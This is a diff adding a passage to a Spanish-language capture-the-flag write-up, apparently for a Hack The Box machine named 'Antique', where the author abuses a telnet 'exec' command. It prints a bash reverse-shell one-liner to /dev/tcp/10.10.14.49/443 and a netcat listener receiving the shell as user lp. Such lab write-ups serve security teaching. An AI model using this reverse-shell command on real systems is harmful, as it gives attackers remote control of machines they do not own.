@@ -204,6 +204,27 @@ exit: quit from telnet session
 > 
 </pre>
 
+Llama la atención la opción de ejecutar comandos con **exec**.
+
+Hacemos una primera prueba co whoami.
+
+<pre>
+> exec whoami
+lp
+> 
+</pre>
+
+Pues vamos a por una consola. Nos ponemos a la escucha por el puerto 443 y enviamos el comando **bash -c "bash -i >& /dev/tcp/10.10.14.49/443 0>&1"**
+
+<pre>
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.49] from (UNKNOWN) [10.10.11.107] 53052
+bash: cannot set terminal process group (1023): Inappropriate ioctl for device
+bash: no job control in this shell
+lp@antique:~$ 
+</pre>
+
 
 
 
